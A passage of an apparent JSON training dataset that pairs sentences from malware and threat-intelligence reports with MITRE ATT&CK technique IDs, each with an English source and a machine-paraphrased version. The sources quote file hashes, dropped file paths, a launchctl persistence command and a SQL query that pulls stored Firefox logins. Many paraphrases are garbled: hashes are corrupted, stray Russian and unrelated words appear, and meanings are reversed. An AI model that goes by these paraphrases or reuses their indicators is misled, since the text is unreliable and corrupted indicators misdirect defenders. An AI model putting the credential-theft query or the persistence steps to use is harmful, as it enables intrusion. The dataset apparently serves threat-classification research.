            "en_text": "For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to “%TEMP%\\flash_update.exe” that was a legitimate Flash Player installer",
            "data_text": "For example, we analyzed a sample of DropIt (SHA256, cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that had fallen two executable file, one of which was stored in \"% TEMP%\\flash_update.exe\" which was a legal program to install Flash Player."
        }
    ],
    "Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\\svchost.exe\\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)": [
        {
            "tec_id": "T1036",
            "en_text": "Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\\svchost.exe\\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)",
            "data_text": "Figure 10: Network Traffic for Downloading the Final Payload (words.exe) After running the file, the following activity is performed: Leave a copy of yourself in %AppData%\\svchost.exe\\svchost.exe and delete the XML file containing the configuration information for the Scheduler Task (as shown in Figure 11)"
        }
    ],
    "Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat": [
        {
            "tec_id": "T1036",
            "en_text": "Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat",
            "data_text": "First, the reason this feature was named MirageFox instead of Mirage is that in the module export directory, the name field is filled with the string MirageFox_Server.dat."
        }
    ],
    "SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1": [
        {
            "tec_id": "T1036",
            "en_text": "SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1",
            "data_text": "SHA256 File name PowerShell Variable 5f001f3387dddfc0314446d0c950da2cec4c786e2374d42beb3ace6883b4e63 <edact> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe d948d5b3702e1e140ef5b796d7976d6d6d796d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6d6dTable 1 of the table"
        }
    ],
    "The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe": [
        {
            "tec_id": "T1036",
            "en_text": "The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe",
            "data_text": "A simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the tafahom.exe file was also involved in the wave against the public person (June 26)."
        }
    ],
    "After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name": [
        {
            "tec_id": "T1036",
            "en_text": "After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name",
            "data_text": "After the .NET PE file was run, we observed the same behavior as above the sample QUADAGENT when a PowerShell script named SystemDiskClean.ps1 appears next to the VBScript file with the same name."
        }
    ],
    "The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5             5a0c4e1925c76a959ab0588f683ab437 Size            46592 bytes Compile Time    2014-11-19 08:55:10Z Import Hash     6b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path “C:\\Users\\Public”, which fails on Windows XP because that path is not present by default": [
        {
            "tec_id": "T1036",
            "en_text": "The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5             5a0c4e1925c76a959ab0588f683ab437 Size            46592 bytes Compile Time    2014-11-19 08:55:10Z Import Hash     6b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path “C:\\Users\\Public”, which fails on Windows XP because that path is not present by default",
            "data_text": "After Hall tent 10x25/2 or the system uploads install.exe, which has the following metadata : the MD5 5a0c4e1925c76a959ab0588f683ab437 The 46592 the byte Компилирование The 2014-11-19 08:55:10Z Import Hash 6b8611f8a6b51e37fd68e75b6aexe..exe to жесткокодированному the way \"C:\\User\\Public\", which does not work on Windows XP, because the default is missing."
        }
    ],
    "One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable": [
        {
            "tec_id": "T1036",
            "en_text": "One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable",
            "data_text": "An example of these samples is below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6ec52e50e98e6b63308fdb File is a self-extracting RAR, which is a common delivery mechanism for PlugX, especially when the possible load will be replaced legitimately"
        }
    ],
    "Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll": [
        {
            "tec_id": "T1036",
            "en_text": "Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll",
            "data_text": "File name qrat.exe File size 1093120 bytes MD5 c05e5131b196f43e1d02ca5ccc48ec0e SHA1 f28c592833f234c619917b5c7d8974840a810247 Notes Droper, which installs the QuasarFile RAT microsoft_net.exe scheduled task file and Microsoft.Win32.TaskScheduler.dll"
        }
    ],
    "Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe": [
        {
            "tec_id": "T1036",
            "en_text": "Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe",
            "data_text": "File Part-I.doc File size 11349102 bytes MD5 92942c5424cd462dd201ae11a560bb8 SHA1 85a21624df2211af3daf05c86a3fbea8271059d3 Notes Malicious RTF document that uses CVE-2017-8570.exe and QuarrateFiles."
        }
    ],
    "Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe": [
        {
            "tec_id": "T1036",
            "en_text": "Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe",
            "data_text": "File Part-II.doc File size 10156713 byte MD5 e32668e569362c96cc56db368b7e821e SHA1 dadc493abbe3e21610539e1d5a423626a6132 Notes Malicious RTF document that uses CVE-2017-8570 m570-quartio file"
        }
    ],
    "Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live": [
        {
            "tec_id": "T1036",
            "en_text": "Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live",
            "data_text": "File name vsrss.exe File size 446976 bytes MD5 5c3456d5932544b779fe814133344fdb SHA1 7ab750afb25457a81c27a98dc6dfd51c27e61b0e Notes Delphi RAT file that beacons to ebejingcn.live."
        }
    ],
    "When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\\Microsoft\\DeviceSync\\VMwareCplLauncher.exe %PROGRAMDATA%\\Microsoft\\DeviceSync\\vmtools.dll %PROGRAMDATA%\\Microsoft\\DeviceSync\\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload": [
        {
            "tec_id": "T1036",
            "en_text": "When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\\Microsoft\\DeviceSync\\VMwareCplLauncher.exe %PROGRAMDATA%\\Microsoft\\DeviceSync\\vmtools.dll %PROGRAMDATA%\\Microsoft\\DeviceSync\\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload",
            "data_text": "When shellcode, built in a power, has occurred three files : % PROGRAMDATA%\\Microsoft\\Устройство\\VMwareCplLauncher.exe % PROGRAMDATA%\\Microsoft\\DeviceSync\\vmtools.dll % PROGRAMDATA%\\Microsoft\\DeviceSync\\MSBuild.exe in the list had files VMwareCplLauncher.exe is legal, signed by an executable program VMware, which serves for the delivery of BADNEWS useful."
        }
    ],
    "The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool": [
        {
            "tec_id": "T1036",
            "en_text": "The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool",
            "data_text": "The vmtools.dll file is a modified DLL that simultaneously provides persistence and downloads MSBuild.exe, which is malware BADNEWS renamed to Microsoft Visual Studio legitimate tool forgery"
        }
    ],
    "These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders": [
        {
            "tec_id": "T1036",
            "en_text": "These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders",
            "data_text": "These digital certificates are often issued in the name of illegal and legitimate companies so as not to arouse suspicion among researchers and incident respondents."
        }
    ],
    "In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded": [
        {
            "tec_id": "T1036",
            "en_text": "In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded",
            "data_text": "In one case, we noticed that one of the original malware delivered to the victim was RATANKBA (TROJ_RATANKBA).A), connects to a legitimate but compromised website (eye-watch[.]in:443, the mobile site from which the hacking tool is also downloaded (nbt_scan.exe)"
        }
    ],
    "One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file": [
        {
            "tec_id": "T1036",
            "en_text": "One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file",
            "data_text": "One of the archive samples analyzed by CTU researchers contains a legitimate PDF file, a benevolent image of interest for purposes (see . Figure 8), and the HttpBrowser installer hidden as an image file."
        }
    ],
    "The legitimate owaauth.dll file resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\ directory": [
        {
            "tec_id": "T1036",
            "en_text": "The legitimate owaauth.dll file resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\ directory",
            "data_text": "The legitimate owaauth.dll file is located in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\ while CTU researchers were watching the backdoor using the same file in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\directory"
        }
    ],
    "It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution": [
        {
            "tec_id": "T1036",
            "en_text": "It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution",
            "data_text": "This was to pretend that Adobe Flash Player updated the installation on the compromised site to draw users to the click to perform"
        }
    ],
    "Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.": [
        {
            "tec_id": "T1036",
            "en_text": "Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.",
            "data_text": "Whitefly often supplies Vcrodat as a malicious DLL, which has the same name as DLLs owned by legitimate software from various security providers."
        }
    ],
    "likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor": [
        {
            "tec_id": "T1036",
            "en_text": "likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor",
            "data_text": "most likely in an attempt to disguise as a red team action tool rather than an advanced actor"
        }
    ],
    "It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions": [
        {
            "tec_id": "T1036",
            "en_text": "It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions",
            "data_text": "She named Metepreter as a WAV file type, probably in the hope that it would not arouse suspicion"
        }
    ],
    "Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement": [
        {
            "tec_id": "T1021.002",
            "en_text": "Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement",
            "data_text": "In addition, part of this early activity shares with current FIN7 operations – using Power Admin PAExec for lateral movement"
        }
    ],
    "The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel": [
        {
            "tec_id": "T1543.001",
            "en_text": "The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel",
            "data_text": "To interact with a specific agent, the actor selects the entry to open in the Agent Control Panel."
        }
    ],
    "Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7": [
        {
            "tec_id": "T1543.001",
            "en_text": "Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7",
            "data_text": "Using the custom agent string or string of the system user agent obtained from urlmon.dll 7"
        }
    ],
    "Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login": [
        {
            "tec_id": "T1543.001",
            "en_text": "Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login",
            "data_text": "Property list with persistent launchctl load /Library/LunchDaemons/Filename.plist > /dev/nul or launchctl download ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to run the dropped backdoor file upon login"
        }
    ],
    "Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots": [
        {
            "tec_id": "T1543.001",
            "en_text": "Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots",
            "data_text": "After starting the backend, Keydnap installs the plist file in /Library/LunchAgents/ if it has root or $USER/Library/LunchAgents/ privileges otherwise to achieve persistence between reboots."
        }
    ],
    "From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation": [
        {
            "tec_id": "T1543.001",
            "en_text": "From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation",
            "data_text": "Based on IP 185.25.50[.]93 C2 we found another hardcoded user agent used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) as Gecko We observed several samples of Zebrocy using this user targeting the Ministry of Foreign Affairs of Greater Central Asia"
        }
    ],
    "Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami": [
        {
            "tec_id": "T1033",
            "en_text": "Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami",
            "data_text": "Figure 6 shows that the Glimpse server responds to the incoming Glimpse agent beacon and sends the whoami command"
        }
    ],
    "The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent": [
        {
            "tec_id": "T1033",
            "en_text": "The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent",
            "data_text": "The screenshot also displays the Glimpse server receiving the results of the whoami command executed by the agent."
        }
    ],
    "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network": [
        {
            "tec_id": "T1033",
            "en_text": "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network",
            "data_text": "The web shell stores the archives locally to the server in the C:\"Users\"Record\\File folder, each with a name with the following structure: [IP address]_c$_User_[User Name]___[Desktop-Documents-Downloads]_[year]-[day]-[minute]-[seconds].7z Threat actors are likely to use this feature to quickly search for new files created by network users"
        }
    ],
    "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field": [
        {
            "tec_id": "T1033",
            "en_text": "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field",
            "data_text": "In November, there was a slight deviation in the grouping where the three samples that we collected still used the author name Joohn for the last modified field, but returned to the default user/user name for the creator field."
        }
    ],
    "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems": [
        {
            "tec_id": "T1033",
            "en_text": "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems",
            "data_text": "This document was also the first from mid-November of the cluster to use the user/USER author name instead of Joohn, further supporting the document copy script between systems"
        }
    ],
    "The same code snippets are combined into a second stage JavaScript in “C:\\Users\\<User Name>\\”": [
        {
            "tec_id": "T1033",
            "en_text": "The same code snippets are combined into a second stage JavaScript in “C:\\Users\\<User Name>\\”",
            "data_text": "In the \"C:\" section, the same code fragments are merged into the second stage of JavaScript.\\Username>\\\""
        }
    ],
    "The username appears to be attacker specified and has occurred in 2017 Bankshot samples": [
        {
            "tec_id": "T1033",
            "en_text": "The username appears to be attacker specified and has occurred in 2017 Bankshot samples",
            "data_text": "The username appears to be indicated by the attacker and occurred in 2017 Bankshot samples"
        }
    ],
    "This links the previous samples with this unique username": [
        {
            "tec_id": "T1033",
            "en_text": "This links the previous samples with this unique username",
            "data_text": "This associates the previous samples with this unique username."
        }
    ],
    "If the Trojan does not have root privileges to enable its automatic launch, it creates the “~/.config/autostart/dbus-inotifier.desktop” file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= “/home/user/” stands here for the environment variable HOME": [
        {
            "tec_id": "T1033",
            "en_text": "If the Trojan does not have root privileges to enable its automatic launch, it creates the “~/.config/autostart/dbus-inotifier.desktop” file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= “/home/user/” stands here for the environment variable HOME",
            "data_text": "If the Trojan horse hidden in no root permissions to automatically start, it creates a file \"~ /. config/autostart/dbus-inotif.desktop\" with the following content : [Desktop Entry] Type=ApplicationExec=/home/user/.config/dbus-notifier/dbus-inotifter Name[en_desktop]EN]=системный service d-bus notifyter Name=системный service d-bus notifyter Comment [en_EN] = Comment = \"/ home/user /\" is variable. HOME environments"
        }
    ],
    "Note that the username could be a small joke on the attackers’ part regarding the attribution to FIN7": [
        {
            "tec_id": "T1033",
            "en_text": "Note that the username could be a small joke on the attackers’ part regarding the attribution to FIN7",
            "data_text": "Note that the username may be a small joke on the part of the attacker regarding the assignment of FIN7"
        }
    ],
    "The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)": [
        {
            "tec_id": "T1033",
            "en_text": "The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)",
            "data_text": "The 0xFEEDFACF magic value belonging to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return a hard-coded .plist property list name\" for the root user (com.apple.screen.assisted.and for the regular user (com.apple.spell.agent.plist)"
        }
    ],
    "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables": [
        {
            "tec_id": "T1033",
            "en_text": "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables",
            "data_text": "Also, this OopsIE option uses the output of the whoami command as a parameter in the URL when communicating with the C2 server, which is different from the previous Oops.IE variant that uses hostname and username from environment variables"
        }
    ],
    "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg": [
        {
            "tec_id": "T1033",
            "en_text": "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg",
            "data_text": "The executable gets the built-in PowerShell script, decrypts it with RC4, then decompresses it with ZLIB, and saves the text to C:\\Username>\\AppData\\Roaming\\Exit.jpg"
        }
    ],
    "code(2343)\", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1": [
        {
            "tec_id": "T1033",
            "en_text": "code(2343)\", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1",
            "data_text": "code(2343)\", MsgBoxStyle.Critically, zero); then, the dropper writes the payload content, which is in the form of plain text in the resource inside .Assembling NET to C:\\Username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1"
        }
    ],
    "File is dropped to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0\\microsoft_network.exe": [
        {
            "tec_id": "T1033",
            "en_text": "File is dropped to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0\\microsoft_network.exe",
            "data_text": "File dropped to C:\\Changers\\%USERNAME%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.00.0\\microsoft_network.exe"
        }
    ],
    "File starts as mico-audio.exe and installs to C:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe": [
        {
            "tec_id": "T1033",
            "en_text": "File starts as mico-audio.exe and installs to C:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe",
            "data_text": "The file starts as mico-audio.exe and installs on C:\\Changers\\%USERNAME%\\AppData\\Roaming\\Google-chrome\\crome.exe"
        }
    ],
    "These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions": [
        {
            "tec_id": "T1033",
            "en_text": "These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions",
            "data_text": "These lines are next формат:uuid=[The Victory]#un=[Username]#cn=[Host name]#on=[The OS]#lan=[IP address]#nop=#ver=1.0uid=[The name of the victims]#un=[Username]#Пример the first line you can see ниже:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0 It should be noted that variable used for that.lines, different from previous versions"
        }
    ],
    "For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc": [
        {
            "tec_id": "T1033",
            "en_text": "For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc",
            "data_text": "For example, in the previous version of BADNEWS, the unique victim ID was stored in the variable 'uid', the user name was stored in the variable 'u', etc."
        }
    ],
    "Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign": [
        {
            "tec_id": "T1033",
            "en_text": "Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign",
            "data_text": "Unique User Agents are unique user agents used in HTTP communications between SpeakUp and C"
        }
    ],
    "(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)": [
        {
            "tec_id": "T1033",
            "en_text": "(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)",
            "data_text": "(Source: Further research has shown additional tools that contain the same user name (see figure). 21)"
        }
    ],
    "PDB strings containing the 'SyberSpace' username": [
        {
            "tec_id": "T1033",
            "en_text": "PDB strings containing the 'SyberSpace' username",
            "data_text": "PDB strings containing 'SyberSpace' user name"
        }
    ],
    "The SP variable is a string containing the victim's username": [
        {
            "tec_id": "T1033",
            "en_text": "The SP variable is a string containing the victim's username",
            "data_text": "Variable SP - string containing the victim's user name"
        }
    ],
    "When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell": [
        {
            "tec_id": "T1033",
            "en_text": "When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell",
            "data_text": "When a malicious ISAPI filter captures a username that matches this variable, it knows to handle an incoming HTTP request as a command to the web gateway"
        }
    ],
    "It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password": [
        {
            "tec_id": "T1033",
            "en_text": "It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password",
            "data_text": "It also attempts to release the following SQL query for the \"signatures.sqlite\" file: \"SELECT hostname, encrypted username, encrypted password FROM moz_logins WHERE timePasswordChanged/1000 ENTREE? And ?\"?\" 117 ftpUpload uses FTPManager:uploadFile method and supplied username,"
        }
    ],
    "The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.": [
        {
            "tec_id": "T1033",
            "en_text": "The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.",
            "data_text": "The shell code performs a system poll to collect the victim's computer name and user name, and then adds these values to the URL string using libjs.inquiryrjs[.]com."
        }
    ],
    "Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.": [
        {
            "tec_id": "T1033",
            "en_text": "Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.",
